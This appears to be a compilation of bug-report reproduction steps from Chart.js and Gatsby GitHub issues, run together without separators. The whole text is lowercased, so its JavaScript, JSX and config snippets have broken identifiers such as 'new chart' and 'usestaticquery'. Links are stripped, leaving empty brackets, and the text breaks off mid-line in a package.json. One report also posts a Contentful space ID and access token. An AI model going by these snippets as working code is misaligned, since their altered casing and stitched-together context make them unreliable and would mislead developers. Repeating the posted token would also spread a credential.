**i fill the background color on the fly using js like this**
`linechartdata['datasets'][i].backgroundcolor = graphconfiguration.colors.tpgs[i];
(for bugs) 1
add options for titlefontsize
hover over to show label
just use a browser chrome and do some resizing of the screen.
create a tooltip with enough content (breaks at least on pie chart and bar chart)
here is a fiddle:
set min ticks to be a number (in this case 1) and max to a number higher than min.
provide data that is below the min (in this case 0)
<!--- reproduce this bug
include code to reproduce, if relevant -->
the issue can be seen at this pen: <!--
[ view this on mobile or chrome webmaster mobile view.
canvas = document.createelement('canvas');
chart = new chart(canvas, ...);
run `npm install chart.js --save-dev`.
add `var chart = require('src/chart.js');` to a script as per documentation.
set up an animation callback (e.g
oncomplete) with a duration of 0
note that there is no object passed in to the callback as per the doco.
<!--- reproduce this bug
include code to reproduce, if relevant -->
use non-bundled moment.js
use a bar chart with time axes and many data points (the above example images used 1568, at 5s intervals)
the bar widths appear to be random.
the final time axis label will probably overlap the one before.
create a line chart with a few x-axis labels (e.g
four) and set the x-axis drawticks to false.
example:
(for bugs) 1
open the live example:
hover mouse on the chart, the error message should be in the console
look at my demos
compare the data in the graph vs all 3 types of time units (day, week, month)
assert the data does not stay consistent, is often truncated on the right-hand-side, and could be avoided if bar charts only used days for bars rather than attempting to clump weeks and months together somehow.
create a bar chart
set displaycolors to false
do not set a label for the dataset
hover on a bar
the number is preceded by a semicolon
see an example here [
immediate upon loading a page with a canvas whose height it set in css.
[fiddle]( the top chart does not occupy the full height of its container
the bottom chart shows it's the label 'autoenrolment' that it is accounting for, even though it is not rendered in the top chart.
use `bar` type
set tooltip mode `index` (or `x-axis` in old version)
multiple datasets and some data is null or undefined
<!--- reproduce this bug
include code to reproduce, if relevant -->
chart type 'bar'
set `min` on the chart
hover over the first bar
var reviewschartoptions = { hover: { mode: 'point', intersect: false } }; var mychart = new chart(ctx, reviewschartdata, reviewschartoptions);
following the example i created a test.
open
click on the button **replace entire data object**
verify that the chart is not updated with the new values (cfr
`newdataobject`), but only `value[0]` in the first dataset is updated (see code for reference)
check lines 132-140 reported here
```javascript console.log(myline.data); // comment out: this one would work, but i want to try a different approach (see following lines) // config.data = newdataobject; // the newdataobject does not override myline.data object: why??? myline.data = newdataobject; // ..
but updating a single value works: why??? myline.data.datasets[0].data[0] = 1000; console.log(myline.data); window.myline.update();
[jsfiddle](
(for bugs) [jsfiddle]( 1
chart type is "bar"
set min or max, both also.
when executed, the bar position will be smaller and shift left
(you can see easily when `categorypercentage` and `barpercentage` is 1 )
line is work.
y axis stacked and logarithmic (x axis needs to be stacked too, otherwise the bars won't stack) ## fiddle
## version
chart.js version: 2.3.0
[here is a plnkr](
<!--- reproduce this bug
include code to reproduce, if relevant -->
create a chart
destroy the chart calling `.destroy()`
var chartoptions = { scales: { yaxes: [{ ticks: { beginatzero: true, stepsize: 1, fixedstepsize:1, min: 0 } }] } }; var mychart = new chart(ctx, reviewschartdata, chartoptions);
(for bugs) add null data elements to the beginning of your datasets data[] array.
(for bugs) ``` type: "bar", data: { labels: ["9/16/2016", "6/21/2017", "12/21/2017"], datasets: [ {data: [10, 20, 38], label: "transcriptomic", backgroundcolor: [\'rgba(54, 162, 235, 0.2)\',\'rgba(54, 162, 235, 0.2)\',\'rgba(54, 162, 235, 0.2)\',\'rgba(54, 162, 235, 0.2)\'], bordercolor: [\'rgba(54, 162, 235, 1)\',\'rgba(54, 162, 235, 1)\',\'rgba(54, 162, 235, 1)\',\'rgba(54, 162, 235, 1)\'] }, {data: [9, 19, 37], label: "epigenomic", backgroundcolor: [\'rgba(255, 159, 64, 0.2)\',\'rgba(255, 159, 64, 0.2)\',\'rgba(255, 159, 64, 0.2)\',\'rgba(255, 159, 64, 0.2)\'], bordercolor: [\'rgba(255, 159, 64, 1)\',\'rgba(255, 159, 64, 1)\',\'rgba(255, 159, 64, 1)\',\'rgba(255, 159, 64, 1)\'] }, {data: [10, 20, 38], label: "proteomic", backgroundcolor: [\'rgba(153, 102, 255, 0.2)\',\'rgba(153, 102, 255, 0.2)\',\'rgba(153, 102, 255, 0.2)\',\'rgba(153, 102, 255, 0.2)\'], bordercolor: [\'rgba(153, 102, 255, 1)\',\'rgba(153, 102, 255, 1)\',\'rgba(153, 102, 255, 1)\',\'rgba(153, 102, 255, 1)\'] }, {data: [0, 19, 28], label: "imaging", backgroundcolor: [\'rgba(255, 99, 132, 0.2)\',\'rgba(255, 99, 132, 0.2)\',\'rgba(255, 99, 132, 0.2)\',\'rgba(255, 99, 132, 0.2)\'], bordercolor: [\'rgba(255,99,132,1)\',\'rgba(255,99,132,1)\',\'rgba(255,99,132,1)\',\'rgba(255,99,132,1)\'] } ] }, options: { title: { display: true, text: "data releases", fontsize: 24 }, scales: {xaxes: [{ stacked: true }], yaxes: [{ stacked: true }] } // convoluted way of saying "stacked bar chart please" }
(for bugs) see this [jsfiddle](
checkout the gatsby repo
`cd gatsby\\examples\\using-cypress`
`npm run test:e2e`
click the accessibility test when the cypress window opens
i've created a repository with minimal steps to reproduce:
it's a basic gatsby example, with just an image added using `gatsby-image`
basic example:
git clone git@github.com:jakubjafra/gatsby-image-build-error.git && cd gatsby-image-build-error
npm i # steps:
gatsby develop # run the gatsby in development mode - so we have .cache & public folders
rm -rf ./public && gatsby build # remove one of the folders, and run gatsby build
gatsby serve # go to localhost:9000 - image is not loaded
# image url like " " returns 404 with html content inside
just run a gatsby app without `import react from 'react';` in any files and run any version above `2.24.85`
the code is located in this repo once cloned run `npm run develop` which will clean the public and cache folders then run gatsby develop.
run gatsby project with the latest gatsby version and react v17
delete import `import react from 'react';` from the file where you use jsx
i created a blog with gatsby (strapi as cms), i sometimes get this error, but not all the time, sometimes it does work, and it seems quite random when that happens
it's written static query error, but i sometimes get it on a page (on the index page and on the blog page so far, where i query for articles data)
when it is on a page, i noticed it helps if i just move the query outside of the component, like so: ```
import react from "react"
import { graphql } from "gatsby" const componentname = ({ data }) => <pre>{json.stringify(data, null, 4)}</pre> export default componentname export const query = graphql` { allstrapiarticles { nodes { article_slug article_title article_summary } } }
``` instead of ```
import react from "react"
import { graphql } from "gatsby" const componentname = ({ data }) => <pre>{json.stringify(data, null, 4)}</pre> export const query = graphql` { allstrapiarticles { nodes { article_slug article_title article_summary } } }
` export default componentname
``` it doesn't always help to move the page query around, so when it doesn't solve it, then i just restart the development after cleaning the cache `gatsby clean && gatsby develop` - and that usually works.
refreshing the page never worked
i mention that i do import a component on the blog page (the sidebar for the blog, which shows the categories), in which i do have a static query (for the blog categories)
when i got this error message in this component, i think it was because i was mapping through the categories without a key and the error disappeared after adding the `key={category.id}`
i don't understand though why sometimes it works and sometimes it doesn't though..
i can't really reproduce it, as you can see
i hope it's no big deal
i am mostly submitting this issue because of the message and because it seems to be quite random and i can't grasp what's happening.
download or update to latest gatsby cli.
open project on vscode and open an integrated terminal within.
start development server
run `gatsby build` & `gatsby serve`
install rimraf
replace the develop/build script with
``` "build": "rimraf .cache && rimraf public && gatsby build", "develop": "rimraf .cache && rimraf public && gatsby develop",
run `yarn develop` repository:
demo project: using a linaria class, like ```jsx
import react from "react"
import { link } from "gatsby" import { css } from "linaria" import layout from "../components/layout"
import image from "../components/image"
import seo from "../components/seo" const styles = { superclass: css` color: red; `,
} const indexpage = () => ( <layout> <seo title="home" /> <h1 classname={styles.superclass}>hi people</h1> <p>welcome to your new gatsby site.</p> <p>now go build something great.</p> <div style={{ maxwidth: `300px`, marginbottom: `1.45rem` }}> <image /> </div> <link to="/page-2/">go to page 2</link> <br /> <link to="/using-typescript/">go to "using typescript"</link> </layout>
) export default indexpage
update following versions in package.json "gatsby": "^2.24.85",
"react": "^17.0.0",
"react-dom": "^17.0.0", npm install
i've create a minimal reproduction that show the problem:
the index page has a button that navigate to `/counter` page
on that page, everytime the button `increase counter` is pressed,
the counter should increase it's value, but this is not appening on gatsby version `2.24.85`
versions prior to `2.24.70` works without problem: 1
run `npm install gatsby@2.24.69`
run `gatsby develop` everytime i click `increase counter` the counter is updating correctly.
make changes rapidly to a page saving multiple times quickly.
install the last version of the plugin and try to run.
i have client only routes defined in my pages/app.js, you can go to /profile and refresh (f5), the pages seems to be mixed, at first seems to be loading the base page, and after that the result is a mix of both pages
repo:
`npx gatsby new gatsby-path-prefix-bug `
`cd gatsby-path-prefix-bug`
`cp src/pages/index.js src/pages/blog.js`
edit `gatsby-config.js` to contain `module.exports = { pathprefix: "/blog" }`
`npx gatsby build --prefix-paths && npx gatsby serve --prefix-paths`
open
- start a brand new typescript gatsby project.
- add a function `export function createschemacustomization({ actions }: `): void {}`
in gatsby-node.ts (or import `createschemacustomizationargs` in any ts files).
- note that actions does not have `createschemacustomization`
npm i -g gatsby-cli
gatsby new mywebsite
cd mywebsite
gatsby develop
then browse to
run `tsc --noemit` on a project including gatsby from npm
the workaround for now is to revert gatsby and gatsby-plugin-utils
npm i gatsby@2.24.80 gatsby-plugin-utils@0.2.34 -e
recreating this issue is a little tricky as it's appeared in the site i'm working on which has 279 files so i was curious to see whether this was a known issue or one that anyone else had been experiencing
i can look into it if there's no other option
interestingly, when throwing together a codesandbox with the gatsby-default-starter the queries that are already present seem to work in it..
so it's potentially an issue on my end?
here is [a minimal reproduction](
and the followings are a bunch of steps to follow:
- get a copy of the minimal reproduction above with git protocol or ssh protocol
- switch to root directory of the minimal reproduction above, run `docker build -f dockerfile -t liuliangsir/blog:latest .` on bash terminal
i tried this : gatsby new gatsby-simplefolio
unfortunately, we don't have a clear way to reproduce the issue, it disappears for a few days and then comes back, no clear repro or scenario we faced.
{ allsanitycalendar(sort: { order: asc, fields: date }) { nodes { title date(formatstring: "mmm dd") remaingtime: date(fromnow: true) timefrom(formatstring: "hh:mm") timeto(formatstring: "hh:mm") isupdated } } } `)
- clone
- npm install
- you will need the following add these access tokens to (these are ok to post> spaceid: lil8n4syivvk , content api access token: rj6yjjxuukb5k7ghg761aj0w0rvcoktwsekhxcztyli) to the `.contentful.json.sample` file in the project root and remove the `.sample` extension
configure gatsby-transformer-csv with an option that doesn't work any more
for example, in my case it was `ignorecolumns` as an array of strings, not a regex
this was rejected by the third party library, but the error was swallowed up and it simply resulted in no nodes being created from the transformer.
set up the site as in this [minimal reproduction]( 2
run `gatsby build`, then `gatsby serve` 3
navigate directly to
run: `npm i gatsby-plugin-sitemap` next: add valid siteurl to sitemetadata inside gatsby-config.js file
next: add `gatsby-plugin-sitemap` to begining of plugins.
run `gatsby develop`
- add the gatsby-source-drupal plugin with the filters option (example: `filters: { 'node--page': 'filter=value' }`).
- run the build and check the urls that are hit.
live project: [
github repo: [ after updating to latest packages i\'m getting this error [see image below] ![alt text]( "typeerror: component gatsby")
plugin config:
{ resolve: `gatsby-plugin-netlify-cms`, options: { manualinit: true, htmltitle: `sleepstation admin`, modulepath: configpath, enableidentitywidget: false, }
gastby start:
gatsby_domain=me.example.test gatsby develop --https --host me.example.test --port 8080 --cert-file ./certificates/me.example.test.crt --key-file ./certificates/me.example.test.key
go to this repo and follow the instructions: alternatively, run this in an existing gatsby project: 1
run `gatsby develop --https`
open the page and check the console
# create new gatsby site
$ gatsby new gatsby-site
$ cd gatsby-site # install and configure postcss as described in gatsby docs
$ npm install postcss gatsby-plugin-postcss postcss-preset-env
# open gatsby-config.js and add plugin exactly as described above
$ cat > gatsby-config.js <<-'eof'
module.exports = { /* your site config here */ plugins: [ { resolve: `gatsby-plugin-postcss`, options: { postcssplugins: [require(`postcss-preset-env`)({ stage: 0 })], }, }, ],
eof # create .css file and add to main page
$ touch src/pages/main.css
$ echo \'import "./main.css"\' | cat - src/pages/index.js > tmp && mv tmp src/pages/index.js # start gatsby development server
$ gatsby develop
clone the repo [here]( 2
run `npm run build` 3
then run `npm run serve` 4
look for the `<content:encoded>` tag in the generated rss.xml file at /blog/rss.xml
it can be seen as empty
updated all my dependencies to latest, tried to build the project, it failed.
my repo :
and run `yarn install`
and `gatsby build`
npm install
``` "dependencies": { "@emotion/cache": "^10.0.29", "@emotion/core": "10.0.35", "@emotion/styled": "^10.0.27", "@emotion/weak-memoize": "^0.2.5", "babel-eslint": "10.1.0", "dotenv": "8.2.0", "emotion-server": "^10.0.27", "eslint": "7.9.0", "eslint-config-airbnb": "^18.2.0", "eslint-config-prettier": "^6.11.0", "eslint-loader": "4.0.2", "eslint-plugin-import": "2.22.0", "eslint-plugin-jest": "24.0.1", "eslint-plugin-jsx-a11y": "^6.3.1", "eslint-plugin-prettier": "^3.1.4", "eslint-plugin-react": "7.20.6", "eslint-plugin-react-hooks": "4.1.2", "gatsby": "2.24.62", "gatsby-image": "2.4.19", "gatsby-plugin-copy-files-enhanced": "^1.1.1", "gatsby-plugin-eslint": "2.0.8", "gatsby-plugin-force-trailing-slashes": "^1.0.4", "gatsby-plugin-manifest": "2.4.30", "gatsby-plugin-netlify": "^2.3.15", "gatsby-plugin-netlify-cms": "^4.3.14", "gatsby-plugin-offline": "^3.2.28", "gatsby-plugin-purgecss": "^5.0.0", "gatsby-plugin-react-helmet": "3.3.11", "gatsby-plugin-sharp": "2.6.36", "gatsby-plugin-sitemap": "2.4.13", "gatsby-plugin-styled-components": "3.3.11", "gatsby-remark-copy-linked-files": "^2.3.15", "gatsby-remark-images": "^3.3.30", "gatsby-remark-relative-images": "2.0.2", "gatsby-source-filesystem": "2.3.30", "gatsby-source-git": "^1.1.0", "gatsby-transformer-remark": "^2.8.35", "gatsby-transformer-sharp": "2.5.15", "marked": "^1.1.1", "moment": "^2.28.0", "netlify-cms-app": "2.12.22", "prettier": "2.1.2", "prop-types": "15.7.2", "react": "16.13.1", "react-dom": "16.13.1", "react-helmet": "6.1.0", "react-modal": "3.11.2", "styled-components": "5.2.0" }
``` config:
``` plugins: [ "gatsby-plugin-less", // source control command to pull data and images { resolve: `gatsby-source-git`, options: { name: "seo-data", local: `${__dirname}/.source-control`, branch: `${process.env.cms_branch}`, remote: `ssh://git@bitbucket.org/${process.env.cms_repo}.git` } }, // add static assets before markdown files { resolve: "gatsby-plugin-copy-files-enhanced", options: { source: `${__dirname}/.source-control/images/`, destination: `/images/`, purge: true } }, { resolve: "gatsby-source-filesystem", options: { path: `${__dirname}/public/images`, name: "images" } }, { resolve: "gatsby-source-filesystem", options: { path: `${__dirname}/.source-control/seo-pages`, name: "pages" } }, // images "gatsby-plugin-sharp", "gatsby-transformer-sharp", // this configures the markdown interpreter { resolve: "gatsby-transformer-remark", options: { plugins: [ // gatsby-remark-relative-images must // go before gatsby-remark-images { resolve: `gatsby-remark-copy-linked-files`, options: { destinationdir: `static/images/uploads` } }, { resolve: "gatsby-remark-images", options: { maxwidth: 2048, linkimagestooriginal: false } } ] } }, "gatsby-plugin-force-trailing-slashes", "gatsby-plugin-react-helmet", "gatsby-plugin-styled-components", { resolve: "gatsby-plugin-eslint", options: { test: /\\.js$|\\.jsx$/, exclude: /(node_modules|.cache|public)/, stages: ["develop"], options: { emitwarning: true, failonerror: false } } }, { resolve: "gatsby-plugin-netlify-cms", options: { manualinit: true, modulepath: `${__dirname}/src/cms/cms.jsx` } }, "gatsby-plugin-netlify" // make sure to keep it last in the array ]
``` i have a mobile hamburger nav toggle that works everywhere else but with the netlify seo pages
somehow the build process is stripping out dom events and i can't determine the plugin or the setting that's causing the issue
<div id={"hamburgermenucontainer"} onclick={() => console.log("onclickcapture")} onclickcapture={() => console.log("onclickcapture")} onmousedown={() => console.log("onmousedown")} onmouseup={() => console.log("onmouseup")} >
``` ### when i pass this ``` <div id={"hamburgermenucontainer"} onclick={() => console.log("onclickcapture")} onclickcapture={() => console.log("onclickcapture")} onmousedown={() => console.log("onmousedown")} onmouseup={() => console.log("onmouseup")} >
### i get this result
``` <marbles id="hamburgermenucontainer">
### what i would like to happen
``` <div id={"hamburgermenucontainer"} onclick={() => console.log("onclickcapture")} onclickcapture={() => console.log("onclickcapture")} onmousedown={() => console.log("onmousedown")} onmouseup={() => console.log("onmouseup")} >
first, i updated gatsby-cli with npm (this is where all started)
then gatsby commands didn't work anymore, i was getting a permission error i found this: [ so i tried to use
npm config set prefix /usr/local which didn't work, then i did
npm config set prefix c:\\users\\catal\\appdata\ oaming\ pm
which is the folder where npm installed packages so far, which still didn't work
then i found this : [ so uninstalled and reinstalled globally both gatsby and gatsby-cli
still didn't work
then i downgraded gatsby-cli to 2.12.106, still doesn\'t work everytime i try to run a gatsby command i get "bash: gatsby: command not found", like for example:
$ gatsby develop
bash: gatsby: command not found
i've created a minimal reproduction of the issue [here](
it's just a hello world starter with `gatsby-plugin-styled-components` plugin installed
steps to reproduce:
clone
run `npm install`
run `gatsby build`
the error should pop up after the "open and validate gatsby-configs" step
<
`gatsby new bug-repro ` 2
add to `.vscode/launch.json` file:
{ "version": "0.2.0", "configurations": [ { "name": "gatsby develop", "type": "pwa-node", "request": "launch", "program": "${workspaceroot}/node_modules/.bin/gatsby", "args": ["develop"], "runtimeargs": ["--nolazy"], "console": "integratedterminal" } ]
checkout [the minimal reproduction](
run `yarn install && yarn run develop`
open ` ` in the browser and try the search field
note that it does work.
change "<2.24.70" in package.json to "^2.24.70"
run `yarn install && yarn run develop`
open ` ` in the browser and try the search field
note that it does not work
it looks like since 2.24.70 the changes to location.search don't cause the useeffect hook to execute
``` useeffect(() => { const newsearchquery = new urlsearchparams(location.search).get(`q`) || `` setsearchquery(newsearchquery) if (newsearchquery) { updateresults(newsearchquery) } }, [location.search])
on the demo link below, scroll all the way to the bottom of the index page, click the link to page 2, and then click the browser back button
you will land back at the top of the index page rather than where you left off at the bottom
demo link:
demo repo:
set up a basic gatsby project with typescript
make sure you have gatsby-cli 2.12.105 installed
run `yarn develop`
i have not been able to reproduce but i have video recordings of people:
[this guys in minute 24
]( - [this guy in minute 7]( i have more recordings if you guys want.
run `yarn develop`
wait until it hangs at `source and transform nodes`
resize iterm2
see everything continue smoothly [this is the project i'm working on at the moment.](
post an empty body to the build webhook of your gatsby project
get a 204 response
this should reproduce it..
use gatsby-image with a fluid image.
here's my [deployed site](
open with safari on an iphone or with an iphone simulator
#### screenshots
this were captured on an iphone
![image](
![error](
**edit: i've tried opening it with an iphone simulator, also same result**
![more result](
if you don't have one, create a synthetic firmlink on recent macos ([this post]( explains how to do it)
create new gatsby project anywhere under the synthetic firmlink
run `gatsby develop` and open the site it in a browser
modify `index.js` (or any other page) and save it
clone and develop/build [gatsby-starter-default]( which i added react-icons and gatsby-webpack-bundle-analyse: `gatsby new treeshake-test
cd treeshake-test
gatsby develop
- clone this repo:
- run `yarn install`
- `cd packages/interface/`
- `yarn build`
go on this link:
create layout component with a static query hook pulling in wordpress menus, run gatsby develop and navigate to the browser.
- clone [this repository](
- follow the steps in the `readme.md`.
create a new starter project: `gatsby new gatsby-test ` as src/pages/index.js use: ```
import { link } from "@reach/router"
import react from "react" export default function home() { return <link to="/page2">page2</link>
``` as src/pages/page2.js use: ```
import { link } from "@reach/router"
import react from "react" export default function page2() { return <link to="/">home</link>
checkout: [
run `gatsby develop`
const image = () => { const data = usestaticquery(graphql` query { placeholderimage: file(relativepath: { eq: "sample.webp" }) { childimagesharp { fluid(maxwidth: 300) { ...gatsbyimagesharpfluid_withwebp } } } } `); return <img fluid={data.placeholderimage.childimagesharp.fluid} />;
this is incredibly hard to reproduce and i cannot give any access to our repositories, due to the commercial nature of the project
so hoping to get some help on debugging/figuring out what causes it.
i have just installed gatsby-cli as per the documentation
`npm install -g gatsby-cli` i wanted to see what else i had globally installed, so i ran
`npm list -g --depth 0` terminal window displays the long list of missing peer dependencies as shown above.
can be reproduced on a barebone gatsby + preact project that i've made.
clone
yarn install && yarn develop
open localhost:8000 in the browser and change something on src/pages/index.js
: a fresh install with the following code on gatsby-node.js: exports.oncreatenode = ({ node, getnode, actions }) => { const { createnodefield } = actions // create a slug for each drupal entity if (node.internal.type === `node__itinerary`) { const slug = createfilepath({ node, getnode, basepath: `contentz`, }) etc...
check out the minimal repro run gatsby in development mode
open the project and switch your os's preferred colour scheme
observe in firefox that the image on the page _and_ the favicon react
while in chrome only the on-page version changes
furthermore
if you manually edit the favicon.png in the public folder, you will see these changes in chrome as it seems to prefer the png over the svg.
hi, recently we experienced an issue in the way the posts are displayed in our blog
in our gatsby app we sort the posts in the query this way: sort: { fields: [date], order: desc } but the order they are displayed doesn match the criteria
we get the posts from datocms
in local is working and showing the post in proper order but not in prod environment (it looks that it show last updated post first)
are we missing something? thanks, diego
my application is huge i can share my entire application
clone mdx starter, start dev server and browse to ````
gatsby new my-mdx-starter
cd my-mdx-starter/
gatsby develop
clone the repo here:
run `npm i && npm run build && npm run serve`
add the following line to the plugin options:
``` icon: `src/images/icon.svg`, // this path is relative to the root of the site.
``` using the following svg file as `icon.svg`:
<svg xmlns=" " viewbox="0 0 128 128">
<defs><radialgradient id="a" cx="64" cy="-48" r="64" fx="64" fy="144" fr="64" gradientunits="userspaceonuse"><stop offset=".3" stop-color="#e31587"/><stop offset=".47" stop-color="#ff3647"/><stop offset=".63" stop-color="#ff980e"/><stop offset=".95" stop-color="#fff44f"/></radialgradient></defs>
<path fill="url(#a)" d="m124.25 64l-4.59 23.06-13.06 19.54-19.54 13.06l64 124.25l-23.06-4.59l21.4 106.6 8.34 87.06 3.75 64l4.59-23.06l15.65 30l11.56-9.64 1.63 14.35 14.51-10.92.35 14.69l64 51.95 36.69 69.07l1.1 5.54 6.06 9.22 9.12 6.2l64 91.72l10.61-2.11 8.56-6.44 4.81-9.49.68-9.91-2.53-9.19-6.14-6.9-3.91-2.61 6.47.05 8.17 3.57-4.76-6.97l77.83 30l-1.84-15.43l82.68.23l4.38 7.5 18.55 22.81 8.11 13.86-2.62-9.89-3.29-8.12 5.06 4.39 6.79 10.16z"/>
``` i put the svg here for reference:
clone my repo (branch `page-errors`)
run `gatsby develop`
go to ` `
open console and see errors
just use gatsby image with webp
impossible to reproduce, because it never happens in development with `gatsby develop`, `gatsby build` and `gatsby serve`, neither in an nginx instance in a docker container and neither in browser with incognito mode (production).
create a node and let it be scheduled for publishing/unpublishing
when the time comes and the node gets updated it triggers a webhook update with the drupal gatsby module for a site running preview in gatsby cloud.
remove nodejs from my windows 10 computer:
- add or remove programs, then remove node.
- clean the %appdata%/npm and %appdata%/npm-cache
install nodejs v14.11.0 with all defaulted options
npm i -g gatsby
run 'gatsby develop' in the terminal
it's hard to reproduce since it doesn't happen always
it usually happens the first time i open the site after deploying it
make changes to site.
deploy on netlify
open a page that has a query in it
this is one of the pages i had blank screen on: [link to gist](
- create contentful space with two environments, e.g
`master` and `development`
- create an access token with only access to the `development` environment
- install the most recent versions of `gatsby` and `gatsby-source-contentful`
- setup `gatsby-source-contentful` to connect to the `development` environment with the access token
- run `gatsby develop`
i can't figure out how to make a reproducible version as i have absolutely no idea what this is boiling down to.
i've been trying to figure it out for literal hours now, i don't know where else to ask
you can access the page with this occurring here: i should note, you need to reload the page or directly go to the link for it to occur
clicking through the menu's to get to it has no issues whatsoever, it's only when directly accessing it
even if i directly access it and navigate using anything that's a <link> and eventually navigate right back to the same page on the same load, it will work again
so it's very specific to the exact first load when directly accessing the page
i also noticed that my header component's uselocation's pathname states `/tv/` (specifically with the ending / too) which i noticed due to the active state of the button, which is odd because no matter where i log uselocation, even the headers one, it always returns the correct `/tv/60572` which is very odd
my gatsby-node setup:
const path = require("path"); exports.createpages = async ({ actions, reporter }) => { const { createpage } = actions const template = path.resolve(`src/pages/index.js`); ["tv", "movie"].foreach(p => { createpage({ path: p, component: template, context: {}, matchpath: `${p}/*` }) })
``` src/pages/index.js:
const indexpage = () => { // states ..
// effect code react.useeffect(() => { // get release data from hmdb api ..
}, []) // site title const title = usestaticquery( graphql` ..
`, ).site.sitemetadata.title const homepage = () => { return <> <seo title={title}/> <div style={{ display: "flex", flexdirection: "row", padding: "1rem calc((100vw - var(--container-width)) / 2) 1rem", }}> <div> <h2>last updated titles</h2> <titleposters titles={tmdb}/> </div> </div> </> } return ( <layout> <seo title={title}/> <router> <homepage default/> <discoverpage path="/:type"/> <titlepage path="/:type/:id"/> <setspage path="/:type/:id/sets"/> <releasespage path="/:type/:id/set/:set"/> </router> </layout> )
create starter project
add `gatsby-plugin-netlify`
add plugin to `gatsby-config.js`
define `assetprefix` to gatsby-config.js
`yarn gatsby build --prefix-paths` to produce a `./public` build with a `_headers` output file
cat ./public/_headers
`gatsby develop`
this is my full gatsby config: changing `markdowncaptions: false` fixes the bug
turn it true and you get the strange behavior.
i followed the steps from and ran: npm run storybook
increase the z-index property of the dropdown menu.
make a gatsby project that uses `promise.allsettled` somewhere in the code.
clone
run `yarn install` and then `gatsby develop`.
it should fail with the error.
if you run `gatsby develop` again, the error is gone.
this bug is very specific to sourcing and then transforming images taken on certain samsung devices so reproducing might be difficult unfortunately
[edit: see comment below] here are details on my setup: i created a new gatsby site with the [using-gatsby-source-wordpress-experimental starter]( made by tyler barnes
i set up the appropriate plugins
i ran `gatsby develop`
all images were sourced correctly and stored locally
after sourcing, images were being transformed and kept failing when reaching images photographed with a samsung galaxy s7.
this is a 2 repo project
i've setup both repos with branches that show a minimum reproduction of this problem
* checkout
* be sure to checkout the `graphql-error-minimum-repro ` branch
* `cd gatsby && yarn && yarn build`
* warning: the build script will create a sibling director to the repo called `open-source-ios-apps` and download a file from github into that directory here's the urls to the 4 images in the reproduction, any one of which will generate this error: *
*
*
*
build site and click on anchor links - the function is called on the first anchor click, but not on the second.
clone remote repo
cmd: sudo gatsby build - within app folder
cd into your projects directory and pick a name for a project that is not used 2
gatsby new [project name] 3
i did the usual: **deleted the cache, node_modules and lockfile, updated npm, gatsby-cli and other packages**
_i have this problem for approximately 3 weeks and its still isn't fixed so i don't think its a bug from gatsby itself._ **live project:**
**repo with code:**
access above url or 1
add `?search=sdfsk#%` part of the url 2
hit enter key on browser addressbar ![image](
= demo/live project i did like i always do; deleted the package.json and cache and reinstalled it with `npm run develop`, normally i get no errors or warnings
but this time it gives a warning through the building stage..
i have performed some standard problem solving steps as follows: remove .cache package-lock.json and node_modules
npm install i get the feeling that there is a mismatch between versions somewhere, but not sure how best to track it down.
run any gatsby command create a new gatsby project
just the above errors
mac os mojave same errors as described above.
- `gatsby new (left the name default)`
- `gatsby-starter-default`
- `cd my-gatsby-project`
- `gatsby build`
- `gatsby serve`
- open page on given url and open console the errors are also emitted again on refresh.
- enter:
- try to grow and shrink from mobile view to desktop view [demo video](
create a fresh install `gatsby new gatsby-2.24.53-test` (the same occurs if just using `npx gatsby new...`)
at this stage gatsby is installed at v2.24.50
the error does not occur under this build.
change into the directory and run `npm run develop` and then (once built) hit `ctrl+c` to confirm the development build shuts down cleanly.
run `npm outdated` and you'll see 2.24.53 is the version that will be installed on an update.
run `npm update` to get the latest version
run `gatsby develop` (so using the global installation of the cli)
hitting `ctrl+c` exits cleanly.
now run `npm run develop` instead.
let gatsby bootstrap and build the development bundle then hit `ctrl+c` to end development
an error is thrown ```
success building development bundle - 4.092s
^c error unhandled rejection lock is already released error: lock is already released - lockfile.js:257 [gatsby-2.24.53-test]/[proper-lockfile]/lib/lockfile.js:257:60 - adapter.js:39 [gatsby-2.24.53-test]/[proper-lockfile]/lib/adapter.js:39:9 - new promise - adapter.js:30 unlock [gatsby-2.24.53-test]/[proper-lockfile]/lib/adapter.js:30:25 - develop.ts:465 foreach [gatsby-2.24.53-test]/[gatsby]/src/commands/develop.ts:465:19 - array.foreach - develop.ts:464 shutdownservices [gatsby-2.24.53-test]/[gatsby]/src/commands/develop.ts:464:11 - develop.ts:411 process.<anonymous> [gatsby-2.24.53-test]/[gatsby]/src/commands/develop.ts:411:11 npm err! code elifecycle
npm err! errno 1
npm err! gatsby-starter-default@0.1.0 develop: `gatsby develop`
npm err! exit status 1
npm err! failed at the gatsby-starter-default@0.1.0 develop script.
npm err! this is probably not a problem with npm
there is likely additional logging output above.
``` the error occurred regardless of terminal used (iterm2 or terminal)
the error did not occur under 2.24.52 or below
i wanted to ensure it wasn't an issue with my local cli configuration so i formatted a spare macbook pro
i re-installed macos catalina and then installed only xcode cli tools (for git) and nvm using the curl install option
once nvm was installed i ran `nvm install node` following by `npm install -g gatsby` and restarted terminal
i then followed the steps outlined above and had the same result on a fresh cleanly installed version of macos.
go to (say) and try to use your keyboard (either page down or just down) to scroll
i tested on both chrome and firefox, and it didn't work on either.
the config looks like : ```
module.exports = { plugins: [ 'gatsby-plugin-sass', 'gatsby-plugin-react-helmet', { resolve: `gatsby-plugin-freshchat`, options: { token: '<secret :)>', host: ' }, }, ],
``` package.json ```
{ "name": "springworks", "version": "0.1.0", "private": true, "dependencies": { "@testing-library/jest-dom": "^4.2.4", "@testing-library/react": "^9.4.0", "@testing-library/user-event": "^7.2.1", "axios": "^0.19.2", "bootstrap": "^4.4.1", "env-cmd": "^10.1.0", "gatsby": "^2.24.53", "gatsby-plugin-freshchat": "^1.0.0-rc1", "gatsby-plugin-react-helmet": "^3.3.10", "gatsby-plugin-sass": "^2.3.12", "grunt": "^1.0.4", "grunt-aws": "^0.7.0", "grunt-cli": "^1.3.2", "husky": "^4.2.5", "node-sass": "^4.14.1", "react": "^16.13.1", "react-bootstrap": "^1.0.0-beta.16", "react-countup": "^4.3.3", "react-dom": "^16.13.1", "react-ga": "^2.7.0", "react-gif-player": "^0.4.2", "react-helmet": "^5.2.1", "react-responsive-carousel": "^3.2.7", "react-router-dom": "^5.1.2", "react-scripts": "^3.4.0", "react-share": "^4.1.0", "react-svg": "^11.0.37", "reactstrap": "^8.4.1" }, "scripts": { "start": "env-cmd -f .env.production react-scripts start", "build-production": "env-cmd -f .env.production react-scripts build", "start-dev": "env-cmd -f .env.develop react-scripts start", "build-develop": "env-cmd -f .env.develop react-scripts build", "pretty-quick": "pretty-quick" }, "eslintconfig": { "extends": "react-app" }, "browserslist": { "production": [ ">0.2%", "not dead", "not op_mini all" ], "development": [ "last 1 